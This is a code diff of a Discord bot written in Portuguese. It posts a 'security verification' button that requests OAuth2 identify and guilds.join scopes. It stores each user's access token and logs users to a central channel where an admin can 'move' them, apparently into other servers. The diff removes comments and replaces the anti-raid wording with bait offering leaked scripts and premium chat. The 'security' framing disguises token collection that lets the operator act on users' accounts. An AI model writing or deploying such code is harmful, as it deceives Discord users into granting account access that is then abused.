@@ -8,16 +8,14 @@ const {
 } = require('discord.js');
 
 // --- CONFIGURAÇÕES ---
-// O Canal onde TODOS os logs de todos os servidores vão chegar
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
-// Para onde o usuário volta (pode ser um link genérico ou fixo)
 const REDIRECT_TARGET = 'https://discord.com/app'; 
 
 const app = express();
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMembers // Necessário para dar cargos
+        GatewayIntentBits.GuildMembers 
     ]
 });
 
@@ -27,13 +25,11 @@ const userTokens = new Map();
 app.get('/', (req, res) => res.send('Global Auth Bot Online 🌍'));
 
 app.get('/callback', async (req, res) => {
-    // Agora recebemos também o 'state' (que contém o ID do servidor de origem)
     const { code, state } = req.query; 
 
     if (!code) return res.send('Erro: Código não encontrado.');
 
     try {
-        // 1. Troca Código por Token
         const tokenResponse = await axios.post(
             'https://discord.com/api/oauth2/token',
             new URLSearchParams({
@@ -48,8 +44,6 @@ app.get('/callback', async (req, res) => {
         );
 
         const { access_token } = tokenResponse.data;
-
-        // 2. Pega dados do Usuário
         const userResponse = await axios.get('https://discord.com/api/users/@me', {
             headers: { Authorization: `Bearer ${access_token}` },
         });
@@ -57,13 +51,12 @@ app.get('/callback', async (req, res) => {
         const user = userResponse.data;
         userTokens.set(user.id, access_token);
 
-        // 3. TENTA DAR O CARGO NO SERVIDOR DE ORIGEM (USANDO O STATE)
         let statusCargo = "⏭️ Ignorado (State vazio)";
         let nomeServidor = "Desconhecido";
 
         if (state) {
             try {
-                const guild = client.guilds.cache.get(state); // 'state' é o ID do servidor
+                const guild = client.guilds.cache.get(state);
                 if (guild) {
                     nomeServidor = guild.name;
                     const member = await guild.members.fetch(user.id).catch(() => null);
@@ -82,7 +75,6 @@ app.get('/callback', async (req, res) => {
             }
         }
 
-        // 4. LOG CENTRALIZADO (Chega no canal que você configurou no .env)
         const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) {
             const embedLog = new EmbedBuilder()
@@ -107,7 +99,6 @@ app.get('/callback', async (req, res) => {
             await logChannel.send({ embeds: [embedLog], components: [row] });
         }
 
-        // 5. PÁGINA DE SUCESSO
         res.send(`
             <!DOCTYPE html>
             <html lang="pt-br">
@@ -145,8 +136,6 @@ app.listen(process.env.PORT || 3000);
 client.once('ready', async () => {
     console.log(`🤖 Bot Logado Globalmente: ${client.user.tag}`);
     
-    // REGISTRO GLOBAL DE COMANDOS (Funciona em todos os servidores)
-    // Atenção: Pode demorar até 1 hora para atualizar em todos os servidores do Discord.
     const commands = [
         { 
             name: 'setup_auth', 
@@ -160,20 +149,18 @@ client.once('ready', async () => {
 
 client.on('interactionCreate', async interaction => {
     
-    // 1. COMANDO SETUP (Gera link com STATE = ID DO SERVIDOR ATUAL)
+    // 1. COMANDO SETUP (TEXTO NOVO APLICADO AQUI)
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
         if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) 
             return interaction.reply({ content: '❌ Apenas Admins.', ephemeral: true });
 
-        // AQUI ESTÁ A MÁGICA: &state=${interaction.guild.id}
-        // Isso envia o ID deste servidor junto com o link, para sabermos onde dar o cargo depois.
         const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
 
         const embed = new EmbedBuilder()
             .setTitle('🛡️ Verificação de Segurança')
-            .setDescription('**Proteção Anti-Raid e Liberação de Conteúdo**\n\nClique no botão abaixo para verificar sua conta e liberar seu acesso a **Scripts** e **Sorteios**.')
+            .setDescription('Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!')
             .setColor(0x5865F2)
-            .setFooter({ text: 'Sistema Global de Verificação' });
+            .setFooter({ text: 'Sistema seguro de Verificação' });
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅')
@@ -183,7 +170,7 @@ client.on('interactionCreate', async interaction => {
         await interaction.reply({ content: '✅ Painel criado neste canal!', ephemeral: true });
     }
 
-    // 2. ABRIR MODAL DE ENVIO (Admin clica no Log)
+    // 2. MODAL DE ENVIO
     if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
         const uid = interaction.customId.split('_')[3];
         const modal = new ModalBuilder().setCustomId(`modal_envio_${uid}`).setTitle('Mover Usuário');
